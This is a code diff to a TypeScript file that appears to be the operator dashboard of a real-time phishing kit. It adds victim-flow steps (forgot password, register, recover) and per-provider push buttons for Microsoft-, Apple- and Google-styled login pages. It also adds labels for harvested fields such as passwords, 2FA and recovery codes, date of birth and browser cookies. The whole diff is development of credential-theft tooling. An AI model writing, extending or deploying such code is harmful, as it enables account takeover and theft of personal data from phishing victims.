@@ -94,6 +94,8 @@ const STEP_LABELS: Record<string, string> = {
   'authenticator': 'Authenticator',
   'cant-use-authenticator': "Can't Use Auth",
   'verify-phone-number': 'Phone Verify',
+  'forgot': 'Forgot Pwd',
+  'forgot-sent': 'Reset Sent',
 };
 
 const STEP_COLORS: Record<string, string> = {
@@ -124,6 +126,9 @@ const STEP_COLORS: Record<string, string> = {
   'authenticator': '#0078D4',
   'cant-use-authenticator': '#047857',
   'verify-phone-number': '#7c3aed',
+  'forgot': '#9f1239',
+  'forgot-sent': '#be185d',
+  'signin-options': '#374151',
 };
 
 const FIELD_LABELS: Record<string, string> = {
@@ -135,6 +140,16 @@ const FIELD_LABELS: Record<string, string> = {
   phone_update: 'Phone Update',
   verification_code: '2FA Code',
   cookies: 'Browser Cookies',
+  reg_email: 'Register Email',
+  reg_password: 'Register Password',
+  reg_name: 'Full Name',
+  reg_dob: 'Date of Birth',
+  reg_verify_code: 'Register Code',
+  rec_email: 'Recovery Email',
+  rec_code: 'Recovery Code',
+  forgot_email: 'Forgot Pwd Email',
+  cant_use_input: "Can't Use Auth",
+  phone_verify: 'Phone Verify Digits',
 };
 
 const PROVIDER_PUSH_STEPS: Record<string, { label: string; step: string; color: string }[]> = {
@@ -145,12 +160,15 @@ const PROVIDER_PUSH_STEPS: Record<string, { label: string; step: string; color: 
     { label: 'Authenticator', step: 'authenticator',        color: '#0078D4' },
     { label: 'Phone Verify',  step: 'verify-phone-number',  color: '#7c3aed' },
     { label: 'Other ways',    step: 'other-ways',           color: '#047857' },
+    { label: 'Register',      step: 'register',             color: '#be185d' },
+    { label: 'Recover',       step: 'recover',              color: '#9f1239' },
   ],
   apple: [
     { label: '↩ Email',     step: 'email',            color: '#4b5563' },
     { label: 'Password',    step: 'password',          color: '#007AFF' },
     { label: 'Device',      step: 'device-trust',      color: '#1d4ed8' },
     { label: 'Verify Code', step: 'verification-code', color: '#6d28d9' },
+    { label: 'Forgot Pwd',  step: 'forgot',            color: '#9f1239' },
   ],
   google: [
     { label: '↩ Email',        step: 'email',          color: '#4b5563' },
